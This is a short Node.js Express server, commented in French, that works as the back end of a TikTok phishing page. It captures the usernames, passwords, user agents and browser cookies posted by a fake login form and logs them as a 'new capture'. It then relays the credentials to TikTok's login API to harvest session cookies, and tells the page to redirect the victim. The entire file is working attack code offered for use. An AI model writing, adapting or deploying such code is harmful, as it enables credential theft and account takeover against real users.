const express = require('express');
const path = require('path');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Route pour recevoir les données de ton index.html
app.post('/api/auth', async (req, res) => {
    const { identifiant, password, userAgent, cookies_locaux } = req.body;

    console.log("--- NOUVELLE CAPTURE ---");
    console.log("Utilisateur :", identifiant);
    console.log("Mot de passe :", password);
    console.log("Appareil (User-Agent) :", userAgent);
    console.log("Cookies Navigateur :", cookies_locaux);

    try {
        // Simulation de connexion au vrai TikTok pour intercepter les cookies Set-Cookie
        // Note : En situation réelle, c'est ici qu'on utilise un "Proxy"
        const tiktokRes = await axios.post('https://www.tiktok.com/api/login', {
            username: identifiant,
            password: password
        }, {
            headers: { 'User-Agent': userAgent }
        });

        // Capture des cookies renvoyés par TikTok
        const setCookies = tiktokRes.headers['set-cookie'];
        console.log("Cookies de Session (Set-Cookie) :", setCookies);

    } catch (err) {
        console.log("Erreur de relais (Normal si identifiants faux) :", err.message);
    }

    // On renvoie une réponse positive pour que le client redirige la victime
    res.json({ status: "ok" });
});

app.listen(PORT, () => {
    console.log(`Serveur de monitoring actif sur le port ${PORT}`);
});
